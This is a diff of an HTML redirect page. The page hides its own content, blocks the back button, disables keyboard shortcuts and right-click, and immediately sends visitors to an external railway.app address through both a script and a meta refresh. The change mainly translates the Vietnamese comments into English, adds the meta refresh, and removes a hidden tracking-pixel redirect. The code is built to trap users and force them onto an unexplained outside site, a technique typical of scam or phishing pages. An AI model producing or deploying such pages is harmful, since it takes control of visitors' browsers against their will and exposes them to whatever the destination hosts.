@@ -2,36 +2,28 @@
 <html style="display:none;">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        * {
-            display: none !important;
-            visibility: hidden !important;
-        }
-    </style>
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0; url=https://web-production-c2a9d.up.railway.app/">
     <script>
-        // Ngăn chặn back/forward
+        // Prevent going back
         history.pushState(null, '', location.href);
         window.onpopstate = function() {
             history.go(1);
         };
-
-        // Vô hiệu hóa phím tắt
+        
+        // Disable keyboard shortcuts
         document.onkeydown = function(e) {
             return false;
         };
-
-        // Vô hiệu hóa chuột phải
+        
+        // Disable right click
         document.oncontextmenu = function(e) {
             return false;
         };
-
-        // Chuyển hướng ngay lập tức
+        
+        // Immediate redirect
         window.location.replace('https://web-production-c2a9d.up.railway.app/');
     </script>
 </head>
-<body>
-    <img src="YOUR_GIF_URL" style="width:1px;height:1px;position:absolute;top:-9999px;" 
-         onload="window.location.replace('https://web-production-c2a9d.up.railway.app/');">
-</body>
+<body></body>
 </html>
